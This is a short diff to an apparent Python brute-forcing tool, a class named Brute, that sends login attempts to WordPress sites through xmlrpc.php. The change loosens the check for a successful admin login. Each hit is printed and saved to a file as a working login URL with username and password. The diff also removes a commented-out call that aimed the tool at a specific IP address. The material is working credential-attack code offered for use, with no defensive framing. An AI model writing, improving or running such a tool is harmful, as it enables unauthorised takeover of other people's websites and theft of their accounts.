@@ -143,8 +143,8 @@ class Brute:
             "Content-Type": "text/xml"
         }
         try:
-            req = requests.post(self.url+"/xmlrpc.php", headers=headers, verify=False, cert=self.cert, timeout=10, data=payload.encode('utf8')).text
-            if "isAdmin" in req:
+            req = requests.post(self.url+"/xmlrpc.php", headers=headers, verify=False, cert=self.cert, timeout=10, data=payload.encode('utf8')).text.lower()
+            if "admin" in req:
                 print(f"[{yellow}XMLRPC{reset}] {self.url} => {green}{username}|{password}{reset}")
                 self.save_content("good.txt", f"{self.url}/wp-login.php#{username}@{password}")
                 return True
@@ -314,6 +314,6 @@ if __name__ == '__main__':
     createDirectory()
     clear()
     main()
-    # startBrute("128.199.83.137/wordpress/")
+
     
     
